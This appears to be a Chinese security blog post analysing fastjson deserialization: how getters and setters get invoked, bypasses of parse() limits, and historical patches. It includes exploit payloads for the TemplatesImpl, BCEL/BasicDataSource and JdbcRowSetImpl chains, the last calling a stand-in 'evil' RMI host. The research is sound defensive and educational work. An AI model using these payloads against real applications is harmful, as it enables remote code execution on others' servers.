<p>\u5148\u6765\u770b\u4e00\u4e0b\u8c03\u7528\u6d41\u7a0b\uff0c\u4ee5\u4e0b\u5206\u6790fastjson\u7248\u672c1.2.24</p> <p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>\uff08ps\uff1a\u8fd9\u91cc\u5f88\u9e21\u8d3c\u7684\u628adeserialize\u7684i\u7ed9\u7701\u7565\u4e86\uff09</p> <p></p> <p>\u9996\u5148\u662f\u7b2c570\u884c\u8c03\u7528\u4e86createInstance\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c06\u4f1a\u5bf9\u5f53\u524d\u8fd8\u539f\u7684\u7c7b\u8fdb\u884c\u5b9e\u4f8b\u5316\uff0c\u8fd9\u91cc\u4f1a\u81ea\u52a8\u8c03\u7528\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570</p> <p>\u5176\u6b21\u662f\u7b2c600\u884c\u8c03\u7528\u4e86parseField\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c06\u5bf9\u6bcf\u4e2a\u7c7b\u5c5e\u6027\u8fdb\u884c\u521d\u59cb\u5316(\u6216\u9012\u5f52\u751f\u6210\u65b0\u7684\u5bf9\u8c61)</p> <p>\u8ddf\u8fdbparseField\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u8c03\u7528\u4e86<code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>\u51fd\u6570\uff0c\u76f4\u63a5\u770b\u5173\u952e\u70b9\u7b2c83\u884c\uff0c\u8c03\u7528\u4e86setValue\u51fd\u6570</p> <p></p> <p>setValue\u51fd\u6570\u5c31\u662ffastjson\u81ea\u52a8\u8c03\u7528getter\u548csetter\u7684\u5173\u952e\u70b9</p> <p></p> <p>\u5982\u679c\u4e0d\u5b58\u5728\u76f8\u5e94\u7684getter\u3001setter\u3001is\u51fd\u6570\uff0c\u5219\u5229\u7528\u53cd\u5c04\u673a\u5236\u5c06value\u8d4b\u503c\u5230\u5f53\u524d\u7684object\u4e0a\uff08\u8fd9\u91cc\u5c31\u662felse\u90e8\u5206\u505a\u7684\u4e8b\u60c5\uff09\u3002</p> <p>\u800c\u5f53fieldInfo\u5b58\u5728\u51fd\u6570\u65f6\uff0c\u5982\u679c\u540c\u65f6\u5b58\u5728getter\u548csetter\uff0c\u5219\u8c03\u7528setter\uff0c\u5982\u679c\u53ea\u5b58\u5728getter\u5219\u8c03\u7528getter\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0bfieldInfo\u7684method\u662f\u600e\u4e48\u586b\u5145\u7684\u5462\uff1f\u8fd9\u91cc\u8981\u770b<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>\u51fd\u6570\uff0cParserConfig\u5728<code>createJavaBeanDeserializer</code>\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528<code>JavaBeanInfo.build</code>\u51fd\u6570\uff0c\u4ee5\u6b64\u586b\u5145fieldInfo\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u9700\u8981\u5206\u6790\u7684\u51e0\u4e2amethod\u3002</p> <p>\u4e0d\u770b\u5177\u4f53\u7684\u4ee3\u7801\uff0c\u5199\u4e00\u4e0b\u7b5b\u9009\u7684\u6761\u4ef6\uff1a</p> <p>setter\u63d0\u53d6\u6761\u4ef6\uff1a</p> <ul> <li>\u51fd\u6570\u540d\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e4</li> <li>\u975e\u9759\u6001\u51fd\u6570</li> <li>\u9650\u5236\u8fd4\u56de\u7c7b\u578b\u4e3avoid\u6216\u5f53\u524d\u7c7b</li> <li>\u51fd\u6570\u53c2\u6570\u53ea\u6709\u4e00\u4e2a</li> <li>\u51fd\u6570\u540d\u4ee5set\u5f00\u5934\uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f\u5927\u5199\u6216\u8005<code>unicde</code>\u6216\u8005<code>_</code>\u6216\u8005\u5b57\u6bcdf\uff1b\u5982\u679c\u51fd\u6570\u540d\u957f\u5ea6&gt;=5\uff0c\u770b\u7b2c5\u4f4d\u5b57\u7b26\u662f\u4e0d\u662f\u5927\u5199\u7684</li> </ul> <p>getter\u63d0\u53d6\u6761\u4ef6\uff1a</p> <ul> <li>\u51fd\u6570\u540d\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e4</li> <li>\u975e\u9759\u6001\u51fd\u6570</li> <li>\u51fd\u6570\u540d\u4ee5get\u5f00\u5934\uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u5927\u5199</li> <li>\u51fd\u6570\u53c2\u6570\u4e3a0\u4e2a</li> <li>\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b\u4e3aCollection\u7684\u5b50\u7c7b\u6216\u672c\u8eab\u3001Map\u7684\u5b50\u7c7b\u6216\u672c\u8eab\u3001AtomicBoolean\u3001AtomicInteger\u3001AtomicLong</li> <li>\u65e0\u76f8\u5bf9\u5e94\u7684setter\u51fd\u6570</li> </ul> <p>\u7ecf\u8fc7\u4e0a\u8ff0\u7684\u4e24\u4e2a\u6761\u4ef6\u63d0\u53d6\u540e\uff0c\u4fdd\u7559\u4e86\u7b26\u5408\u6761\u4ef6\u7684getter\u548csetter\uff0c\u5e76\u4e8e<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>\u51fd\u6570\u4e2dinvoke\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4e3b\u52a8\u8c03\u7528readObject\u51fd\u6570\u7684\u6548\u679c\u3002</p> <p>\u77e5\u9053\u4e86\u4e0a\u8ff0\u7684\u6761\u4ef6\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4f20\u5165\u67d0\u5b57\u6bb5\u7684\u65b9\u5f0f\u6765\u4e3b\u52a8\u8c03\u7528\u76f8\u5173\u7b26\u5408\u6761\u4ef6\u7684setter\u548cgetter\u3002\u4f8b\u5982\u5728Person\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2asetTest\u51fd\u6570\uff0c\u5e76\u5728\u9700\u8981\u8f6c\u5316\u7684json\u4e2d\u6dfb\u52a0<code>\"test\":1</code>\uff0c\u5c06\u4f1a\u4e3b\u52a8\u8c03\u7528<code>setTest</code>\u3002</p> <p>\u6211\u4eec\u5728\u5229\u7528<code>@type</code>\u6784\u9020\u6709\u5371\u5bb3\u7684\u5229\u7528\u94fe\u65f6\uff0c\u4e3b\u8981\u5c31\u662f\u67e5\u627e\u6709\u5371\u5bb3\u7684\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u3001\u7b26\u5408\u6761\u4ef6\u7684getter\u548csetter\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-parsegetters","title":"3. \u7a81\u7834parse\u4e0d\u80fd\u8c03\u7528\u6240\u6709getters\u7684\u9650\u5236","text":"<p>\u8fd9\u91cc\u7684\u7a81\u7834\u601d\u8def\u4e3b\u8981\u6709\u4e24\u4e2a\uff1a</p> <ol> <li>tomcat bcel\u7684poc</li> <li>threedream\u5e08\u5085\u53d1\u73b0\u7684\u5f15\u7528\u7684\u65b9\u5f0f</li> </ol>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#tomcat-bcel-poc","title":"\u7b2c\u4e00\u79cd\uff1aTomcat BCEL POC\u601d\u8def","text":"<p>\u8fd9\u4e2apoc\u5de7\u5999\u7684\u5229\u7528\u4e86<code>JSONObject.toString</code>\u51fd\u6570\uff0c\u5148\u6765\u770b\u770b\u8fd9\u4e2a<code>toString</code></p> <p>\u8fd9\u4e2a<code>toString</code>\u7ee7\u627f\u81ea<code>JSON</code></p> <p></p> <p>\u8fd9\u91cc\u4ed6\u76f4\u63a5\u8c03\u7528\u4e86<code>toJSONString</code>\u51fd\u6570</p> <p></p> <p>\u770b\u5230\u540e\u7eed\u4ed6\u5c06\u5f53\u524d\u8fd9\u4e2aJSONObject\u5b9e\u4f8b\u8fdb\u884c\u4e86obj to str\u7684\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u4f7f\u7528\u9759\u6001\u51fd\u6570<code>JSON.toJSONString</code>\u6765\u5e8f\u5217\u5316\u6570\u636e\u4e00\u6837\uff0c\u8fd9\u91cc\u5c06\u4f1a\u8c03\u7528\u5f53\u524d\u8fd9\u4e2a\u7c7b\u7684\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684getters\uff08\u8fd9\u91cc\u7684\u6761\u4ef6\u6bd4\u8c03\u7528parse\u65f6\u5bbd\u677e\uff0c\u4ed6\u5bf9\u8fd4\u56de\u7c7b\u578b\u65e0\u9650\u5236\uff09\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u627e\u5230\u4e00\u5904\u53ef\u4ee5\u4f7f\u7528JSONObject\u8c03\u7528toString\u7684\u5730\u65b9\u5c31\u53ef\u4ee5\u4e86</p> <p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p> <p></p> <p>\u8fd9\u91cc\u6709\u4e00\u5904\u5982\u679c\u5f53\u524dobject\u4e3aJSONObject\u7c7b\u578b\u65f6\uff0c\u5c06\u4f1a\u5bf9\u5f53\u524d\u7684\u8fd9\u4e2akey\u8c03\u7528<code>toString</code>\u51fd\u6570\u3002\u8fd9\u91cc\u5728\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5982\u679c\u9047\u5230<code>{</code>\uff0cfastjson\u4f1a\u52a0\u4e00\u5c42JSONObject\u3002</p> <p></p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7c7b\u4f3c</p> <pre><code>{{some}:x}\n</code></pre> <p>\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6b64\u65f6\u7684key\u4e3a<code>{}</code>(\u4e5f\u5c31\u662f\u4e0b\u4e00\u5c42\u7684JSONObject)\uff0cvalue\u4e3a<code>x</code>\u3002\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97fastjson\u53bb\u8c03\u7528<code>key.toString</code>\u51fd\u6570\uff0c\u8fd9\u4e2a<code>toString</code>\u7684\u8fc7\u7a0b\u4e5f\u5c31\u662f\u5c06key\u8c03\u7528<code>toJSONString</code>\u7684\u8fc7\u7a0b\uff0c\u610f\u5473\u7740\u5c06\u4f1a\u8c03\u7528\u5f53\u524dkey\u5bf9\u8c61\u7684\u6240\u6709getters\u3002\u5230\u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7fparse\u51fd\u6570\u62e5\u6709\u4e0eparseObject\u4e00\u6837\u7684\u6267\u884c\u6548\u679c\uff0c\u4ee5\u4e0b\u9762\u7684poc\u4e3a\u4f8b\u3002</p> <pre><code>{// \u7b2c\u4e00\u5c42JSONObject\uff0c\u4ed6\u7684key\u4e3a\u53e6\u5916\u4e00\u4e2aJSONObject\n        {// \u4e0b\u4e00\u5c42JSONObject\uff0c\u4ed6\u7684\u5185\u5bb9\u5c06\u4f1a\u8c03\u7528toJSONString\n            \"x\":{// \u5177\u4f53\u89e6\u53d1\u70b9\u4e3agetConnection\n                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n                \"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},        \n        \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\"\n         }\n     }:\"x\"\n};\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#ref","title":"\u7b2c\u4e8c\u79cd\uff1a<code>$ref</code>\u70b9","text":"<p>\u5f53fastjson\u7248\u672c&gt;=1.2.36\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>$ref</code>\u7684\u65b9\u5f0f\u6765\u8c03\u7528\u4efb\u610f\u7684getter</p> <p>\u4ee51.2.48\u7248\u672c\u4e3a\u4f8b\uff0c\u9996\u5148\u770b\u4e00\u4e0b\u9047\u5230<code>$ref</code>\u662f\u600e\u4e48\u5904\u7406\u7684</p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p> <p></p> <p>\u5f53\u9047\u5230\u5f15\u7528<code>$ref</code>\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f1a\u589e\u52a0\u4e00\u4e2aresolveTask\uff0c\u7559\u5728parse\u7ed3\u675f\u540e\u8fdb\u884c\u5904\u7406</p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p> <p></p> <p>\u8c03\u7528<code>JSONPath.eval</code>\uff0c\u5173\u4e8eJSONPath\u7684\u4ecb\u7ecd</p> <p>\u8fd9\u91cc\u7684eval\u51fd\u6570\u6700\u7ec8\u4f1a\u53bb\u8c03\u7528<code>JSONPath.getPropertyValue</code>\u51fd\u6570\uff08\u8fd9\u91cc\u5176\u5b9e\u662f\u53ef\u4ee5\u6839\u636e\u6211\u4eec\u4f20\u5165\u7684\u5185\u5bb9\u53bb\u8c03\u7528\u4e0d\u540c\u7684Segement\uff0c\u6bd4\u5982\u8fd9\u91cc\u7528\u4e86$.value\u7684\u65b9\u5f0f\u4f7f\u7528\u7684\u662fPropertySegement\uff09</p> <p></p> <p>\u540e\u7eed\u5c31\u4e0d\u8be6\u7ec6\u5206\u6790\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u5b58\u5728\u76f8\u5e94\u7684getter\uff0c\u5c31\u4f1a\u53bbinvoke\u8fd9\u4e2a\u51fd\u6570\uff1b\u5982\u679c\u6ca1\u6709\uff0c\u90a3\u4e48\u5c31\u4f1a\u7528\u53cd\u5c04\u673a\u5236\u53bb\u83b7\u53d6\u5c5e\u6027\u7684\u503c\u3002</p> <p>\u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50</p> <pre><code>json = \"{\" +\n          \"\\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\" +\n          \"\\\"driverClassLoader\\\": {\\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\" +\n          \"\\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$...\\\",\" +\n          \"\\\"connection\\\":{\\\"$ref\\\": \\\"$.connection\\\"}\"+\n                \"}\";\n</code></pre> <p>\u4f1a\u53bb\u8c03\u7528<code>getConnection</code>\u51fd\u6570\uff0c\u8fd9\u91cc\u4e5f\u7a81\u7834\u4e86parse\u5230parseObject\u7684\u6548\u679c</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#4-private","title":"(4). private\u5c5e\u6027","text":"<p>\u8fd8\u6709\u4e00\u70b9\u9700\u8981\u6ce8\u610f\u7684\u662f\u9ed8\u8ba4fastjon\u5728\u8f6c\u5316\u65f6\uff0c\u5982\u679c\u6ca1\u6709setter\u51fd\u6570\uff0c\u800c\u662f\u4ee5\u53cd\u5c04\u673a\u5236\u6765\u8d4b\u503c\u7684\u60c5\u51b5\uff0c\u4f1a\u5ffd\u7565private\u5c5e\u6027\u7684\u8f6c\u5316\u3002\u610f\u5473\u7740\u5982\u679c\u6211\u4eec\u5728\u6784\u9020\u8fc7\u7a0b\u4e2d\uff0c\u586b\u5145\u8fdb\u53bb\u7684\u5c5e\u6027\u662fprivate\u7684\u4e14\u6ca1\u6709setter\uff0c\u90a3\u4e48\u5728\u8f6c\u5316\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u4f1a\u88ab\u586b\u5165\u8fd8\u539f\u540e\u7684\u5bf9\u8c61\u7684\u3002\u5982\u679c\u9700\u8981\u5bf9private\u5c5e\u6027\u8fdb\u884c\u8f6c\u5316\uff0c\u90a3\u4e48\u9700\u8981\u8bbe\u7f6e<code>Feature.SupportNonPublicField</code></p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x02-exp","title":"0x02 EXP\u5206\u6790","text":"<p>\u76f8\u6bd4\u4e8eJava\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6784\u9020\u7684\u590d\u6742\u6027\uff0cfastjson\u5229\u7528\u94fe\u4e3b\u8981\u662f\u5bfb\u627e\u53ef\u5229\u7528\u7684getter\u3001setter\u7b49\uff0c\u5e38\u89c1\u7684\u51e0\u79cdPOC\u5982\u4e0b\u6587\u6240\u793a\uff1a</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-templatesimpl","title":"(1). templatesimpl","text":"<p>\u53c2\u8003\uff1ahttp://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</p> <p>\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u6784\u9020\u51fd\u6570\u3001setter\u6216getter\u51fd\u6570\u3002\u5728\u5206\u6790Commons-Collections\u7cfb\u7edf\u7684\u5229\u7528\u94fe\u65f6\uff0c\u63d0\u5230\u8fc7templatesimpl\u7684\u6267\u884c\u65b9\u5f0f\uff0c\u901a\u8fc7\u8f7d\u5165bytecodes\u7684\u65b9\u5f0f\u6765\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c(\u5177\u4f53\u4e0d\u518d\u5206\u6790)\u3002</p> <p>\u5176\u4e2d\u89e6\u53d1\u8f7d\u5165\u7684\u51fd\u6570\u4e3a<code>newTransformer</code>\u51fd\u6570\uff0c\u800c\u5f88\u5de7\u7684\u662f\uff0ctemplatesimpl\u5b58\u5728\u4e00\u4e2agetter\u8c03\u7528\u4e86\u8be5\u51fd\u6570</p> <p></p> <p>\u90a3\u4e48\u5f88\u660e\u663e\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u586b\u5165<code>outputProperties</code>\u7684\u65b9\u6cd5\u6765\u89e6\u53d1<code>getOutputProperties</code>\uff08\u4ed6\u6070\u5de7\u65e0setter\uff0c\u8fd4\u56de\u503c\u4e5f\u7b26\u5408\u6761\u4ef6\uff09\u3002\u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6211\u4eec\u9700\u8981\u586b\u5145\u7684\u7c7b\u5c5e\u6027\u90fd\u662fprivate\u7c7b\u578b\uff0c\u8981\u60f3\u6267\u884c\u8be5\u5229\u7528\u94fe\uff0c\u9700\u8981\u5728\u8c03\u7528parseObject\u51fd\u6570\u65f6\u586b\u5165<code>Feature.SupportNonPublicField</code>\u3002\u4ee5\u4e0b\u56fe\u4e3a\u4f8b\uff0c\u5c06\u8c03\u7528\u8ba1\u7b97\u5668</p> <pre><code>String jsonString = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\" +\n        \"\\\"_name\\\":\\\"goodjob\\\",\\\"_tfactory\\\":{},\" +\n        \"\\\"_bytecodes\\\":[\\\"yv66vgAAADQAOgoAA...\\\"],\" +\n        \"\\\"_outputProperties\\\":null}\";\n</code></pre> <p>\u8fd9\u91cc\u7684bytecodes\u53ef\u4ee5\u7528ysoserial\u5de5\u5177\u6765\u751f\u6210\u3002\u5728\u6784\u9020payload\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f<code>_tfactory</code>\u5fc5\u987b\u586b\u4e0a\uff0c\u56e0\u4e3a\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u5b83\u4e3anull\uff0c\u4f1a\u62a5\u9519\u65e0\u6cd5\u8fdb\u5165\u8f7d\u5165bytecodes\u7684\u6b65\u9aa4\u3002\u975e\u5e38\u597d\u7684\u662f\uff0c\u6211\u4eec\u53ea\u8981\u586b\u4e0a<code>_tfactory:{}</code>\uff0cfastjson\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u8c03\u7528TransformerFactoryImpl\uff08_tfactory\u7684\u7c7b\uff09\u7684\u65e0\u53c2\u6784\u9020\u51fd\u6570\u8fdb\u884c\u5b9e\u4f8b\u5316\u3002<code>\\_</code>\u5728smartMatch\u51fd\u6570\u88ab\u66ff\u6362\u4e3a\u7a7a\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cbyte[]\u7c7b\u578b\u5728fastjson\u8f6c\u5316\u4e2d\u4f1a\u88abbase64\u7f16\u7801</p> <p></p> <p>\u6240\u4ee5payload\u4e2d\u662f\u4e00\u957f\u4e32base64\u7684\u5b57\u4e32\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2apoc\u5176\u5b9e\u9650\u5236\u8fd8\u662f\u633a\u5927\u7684\uff0c\u9700\u8981fastjson parseObject\u65f6\u586b\u4e0a<code>Feature.SupportNonPublicField</code>\u624d\u53ef\u4ee5\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-jndi","title":"(2). \u57fa\u4e8eJNDI\u7684\u5229\u7528","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053\u5982\u679cJNDI\u7684lookup\u51fd\u6570\u53c2\u6570\u503c\u53ef\u63a7\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528JNDI Reference\u7684\u65b9\u6cd5\u52a0\u8f7d\u8fdc\u7a0b\u4ee3\u7801\u8fbe\u6210RCE\u5229\u7528\u3002\u6240\u4ee5\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5728<code>\u65e0\u53c2\u6784\u9020\u51fd\u6570</code>\u3001<code>\u7b26\u5408\u6761\u4ef6\u7684setter</code>\u3001<code>\u7b26\u5408\u6761\u4ef6\u7684getter</code>\u91cc\u53d1\u73b0\u4e00\u4e2a\u53ef\u63a7\u7684lookup\u51fd\u6570\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528JNDI\u7684\u6ce8\u5165\u65b9\u6cd5\u6765\u8fbe\u6210\u5229\u7528\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#jdbcrowsetimpl","title":"JdbcRowSetImpl","text":"<p>JdbcRowSetImpl\u5bf9\u8c61\u53ef\u4ee5\u88ab\u6211\u4eec\u7528\u505a\u4e0a\u8ff0\u7684\u5229\u7528\uff0c\u6765\u770b\u4e00\u4e0b\u4ed6\u7684\u4ee3\u7801</p> <p></p> <p>\u8fd9\u6b21\u51fa\u95ee\u9898\u7684\u5730\u65b9\u5728\u4e8esetAutoCommit\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u8c03\u7528\u4e86connect\u51fd\u6570\u6765\u91cd\u65b0\u53d1\u8d77\u4e00\u4e2ajdbc\u7684\u8fde\u63a5</p> <p></p> <p>\u5728connect\u51fd\u6570\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8c03\u7528\u4e86lookup\u51fd\u6570\uff0c\u5176\u53c2\u6570\u503c\u7531<code>getDataSourceName</code>\u6765\u83b7\u53d6\uff0c\u8be5\u51fd\u6570\u4e3b\u8981\u8fd4\u56de\u5c5e\u6027<code>dataSource</code>\uff0c\u6839\u636efastjson\u7684\u5229\u7528\u539f\u7406\uff0c\u6211\u4eec\u53ea\u9700\u8981\u586b\u5145<code>dataSource</code>\u548c<code>autoCommit</code>\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u91cc\u7684JNDI\u6ce8\u5165\u3002</p> <pre><code>{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil:1099/test\",\"autoCommit\":true}\n</code></pre> <p>\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u7684\u53ef\u4ee5\u7528\u6765JNDI\u6ce8\u5165\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982<code>org.hibernate.jmx.StatisticsService</code>\u7684<code>setSessionFactoryJNDIName</code>\u51fd\u6570\uff0c\u539f\u7406\u4e00\u6837\u4e0d\u518d\u53d9\u8ff0\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-tomcat-dbcp-basicdatasource","title":"(3). Tomcat dbcp BasicDataSource","text":"<p>\u540c1\u4e2d\u7684TemplateImpl\uff0cBasicDataSource\u4e5f\u53ef\u4ee5\u8f7d\u5165\u4efb\u610f\u7684\u5bf9\u8c61\u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u5148\u6765\u8bb2\u4e00\u4e0b\u4ed6\u7684\u539f\u7406</p> <p>\u524d\u9762\u7684\u57fa\u7840\u77e5\u8bc6\u91cc\u63d0\u5230\u4e86\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u7b26\u5408\u6761\u4ef6\u7684getters\uff0c\u5728<code>BasicDataSource</code>\u5b58\u5728\u4e00\u4e2a<code>getConnection</code>\u51fd\u6570\uff0c\u4ed6\u4e3b\u8981\u8c03\u7528<code>createConnectionFactory</code></p> <p></p> <p>\u5728<code>createConnectionFactory</code>\u51fd\u6570\u4f7f\u7528Class.forName\u52a0\u8f7d\u7c7b</p> <p></p> <p>\u8fd9\u90e8\u5206driverClassName\u548cdriverClassLoader\u662f\u53ef\u63a7\u7684\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u8981\u7528\u5230\u7684\u662f<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>\uff0c\u8fd9\u4e2aClassLoader\u53ef\u4ee5\u4ececlassname\u4e2d\u63d0\u53d6\u51faBCEL\u683c\u5f0f\u7684class\u5b57\u8282\u7801\uff0c\u5e76\u8c03\u7528defineClass\u8fdb\u884c\u8f7d\u5165</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u7528\u4e86\u9759\u6001\u5757\u7684\u7c7b\u6765\u6267\u884c\u4ee3\u7801\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x03-fastjson","title":"0x03 Fastjson\u5386\u53f2\u7248\u672c\u4fee\u590d\u63aa\u65bd","text":"<p>\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u8bb2\u8ff0\u51e0\u4e2a\u91cd\u8981\u7248\u672c\u7684\u5b89\u5168\u66f4\u65b0</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-fastjson-1225","title":"(1). fastjson == 1.2.25","text":"<p>\u9ed8\u8ba4\u5173\u95ed<code>AutoType</code>\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f<code>@type</code>\u7684\u652f\u6301\uff0c\u89c1enable_autotype</p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p> <p></p> <p>\u5f53\u9047\u5230<code>@type</code>\u65f6\uff0c\u4f1a\u5148<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>\u3002\u8be5\u51fd\u6570\u7684\u4e00\u4e2a\u4e3b\u8981\u903b\u8f91\uff081.2.25\u7248\u672c\uff09</p> <ol> <li>\u5f00\u542f\u4e86<code>AutoType</code>\u65f6\uff0c\u4f1a\u8fc7\u4e00\u6b21\u9ed1\u540d\u5355\u548c\u767d\u540d\u5355\u68c0\u6d4b\uff08\u5148\u68c0\u6d4b\u767d\u540d\u5355\uff0c\u540e\u68c0\u6d4b\u9ed1\u540d\u5355\uff09\u3002</li> </ol> <p></p> <p>\u4f18\u5148\u8f7d\u5165\u4eba\u5de5\u914d\u7f6e\u7684\u767d\u540d\u5355\u7c7b\uff0c\u5e76\u5bf9\u9ed1\u540d\u5355\u7c7b\u7206\u51fa\u5f02\u5e38\uff1b</p> <ol> <li> <p>\u8fd9\u91cc\u5148\u5ffd\u7565\u672a\u5f00\u542f<code>AutoType</code>\u65f6\u7684\u68c0\u6d4b\u5904\u7406</p> </li> <li> <p>\u524d\u9762\u7684\u60c5\u51b5\u90fd\u4e0d\u7b26\u5408\uff0c\u5e76\u4e14\u5f00\u542f\u4e86<code>AutoType</code>\uff0c\u5219\u5c1d\u8bd5\u53bb\u8f7d\u5165\u4efb\u610f\u7c7b\uff0c\u4f46\u662f\u4e0d\u53ef\u4ee5\u8f7d\u5165ClassLoader\u548cDataSource\u7684\u5b50\u7c7b</p> </li> </ol> <p></p> <p>\u8fd9\u91cc\u8f7d\u5165\u7684\u65b9\u6cd5\u7528\u7684\u90fd\u662f<code>TypeUtils.loadClass</code>\uff0c\u6765\u770b\u4e00\u4e0b\u4ed6\u7684\u4e00\u4e2a\u5904\u7406</p> <ul> <li>\u9996\u5148\u4ed6\u5bf9\u4e8e<code>Lxxx.class.xxx;</code>\u7684\u7c7b\u8868\u793a\u65b9\u6cd5\u505a<code>L</code>,<code>;</code>\u7684\u5254\u9664\uff0c\u9012\u5f52\u8c03\u7528loadClass\u53bb\u8c03\u7528\u5185\u90e8\u7684\u5177\u4f53\u7c7b</li> </ul> <p></p> <ul> <li>\u540e\u7eed\u7684\u8c03\u7528\u65b9\u6cd5\u4e3a\u4f7f\u7528<code>AppClassLoader.loadClass</code>\u6216<code>Class.forName</code>\u53bb\u52a0\u8f7d\u7c7b</li> 